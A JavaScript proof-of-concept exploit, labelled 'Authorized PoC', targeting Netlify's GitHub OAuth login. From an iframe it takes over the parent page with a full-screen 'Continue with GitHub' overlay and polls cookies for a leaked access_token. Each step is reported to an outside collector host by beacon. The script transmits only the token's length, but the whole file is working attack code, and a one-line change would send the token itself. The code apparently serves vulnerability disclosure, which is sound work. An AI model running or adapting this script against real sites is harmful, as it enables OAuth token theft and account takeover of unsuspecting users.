(() => {
  const COLLECTOR =
    "https://http-log-collector.netlify.app/api/log";

  function log(step, extra = "") {
    const url = new URL(COLLECTOR);
    url.searchParams.set("s", step);

    if (extra) {
      url.searchParams.set("d", String(extra).slice(0, 200));
    }

    try {
      navigator.sendBeacon(url.toString());
    } catch {
      try {
        new Image().src = url.toString();
      } catch {}
    }
  }

  function run() {
    log("1-start");

    // parent.document is accessible only when the iframe and parent
    // are same-origin, or document.domain was compatibly configured.
    let targetWindow;
    let targetDocument;

    try {
      targetWindow = window.parent;
      targetDocument = targetWindow.document;

      // Force a same-origin access check.
      void targetDocument.location.href;

      log("2-parent-ok");
    } catch (error) {
      log("2-parent-ERR", error?.message || error);

      // Safe fallback: operate inside the iframe itself.
      targetWindow = window;
      targetDocument = document;
    }

    function appendLink() {
      if (!targetDocument.body) {
        targetWindow.setTimeout(appendLink, 100);
        return;
      }

      try {
        const oldLink =
          targetDocument.getElementById("oauth-poc-link");

        if (oldLink) oldLink.remove();

        const link = targetDocument.createElement("a");

        link.id = "oauth-poc-link";
        link.href =
          "https://api.netlify.com/auth" +
          "?provider=github" +
          "&site_id=app.netlify.com" +
          "&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09" +
          "&login=true" +
          "&entry_point=direct" +
          "&browser_fingerprint=cbdb5739abc754bdcc16cbd4fb07cd0f" +
          "&device_fingerprint=bbbac72e6221cf088819fff54ca43b40" +
          "&redirect=" +
          encodeURIComponent("https://www.netlify.com/") +
          "&use_redirect=true";

        link.target = "_blank";
        link.rel = "noopener noreferrer";
        link.textContent = "Continue with GitHub";

        Object.assign(link.style, {
          position: "fixed",
          inset: "0",
          width: "100vw",
          height: "100vh",
          background: "#fff",
          color: "#000",
          fontSize: "48px",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          zIndex: "2147483647",
          textDecoration: "none",
          cursor: "pointer"
        });

        targetDocument.body.appendChild(link);
        log("3-link-appended");
      } catch (error) {
        log("3-link-ERR", error?.message || error);
        return;
      }

      let ticks = 0;

      const intervalId = targetWindow.setInterval(() => {
        ticks++;

        try {
          const cookies = targetDocument.cookie || "";
          const match = cookies.match(
            /(?:^|;\s*)_initial_landing_page=([^;]*)/
          );

          if (ticks <= 5) {
            log(`4-tick-${ticks}`, match ? "cookie-found" : "not-yet");
          }

          if (!match) return;

          let landingPage;

          try {
            landingPage = decodeURIComponent(match[1]);
          } catch {
            landingPage = match[1];
          }

          const tokenMatch =
            landingPage.match(/[?#&]access_token=([^&#]+)/);

          if (!tokenMatch) {
            log("5-cookie-found-no-token");
            return;
          }

          // Safe proof: establish accessibility without exporting the secret.
          targetWindow.clearInterval(intervalId);
          log("6-token-accessible", `length=${tokenMatch[1].length}`);

          console.warn(
            "Authorized PoC: access_token was readable; value intentionally not transmitted."
          );
        } catch (error) {
          targetWindow.clearInterval(intervalId);
          log("4-interval-ERR", error?.message || error);
        }
      }, 2000);

      // Stop endless polling after one minute.
      targetWindow.setTimeout(() => {
        targetWindow.clearInterval(intervalId);
        log("7-timeout");
      }, 60_000);

      log("4-interval-set");
    }

    appendLink();
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", run, { once: true });
  } else {
    run();
  }
})();
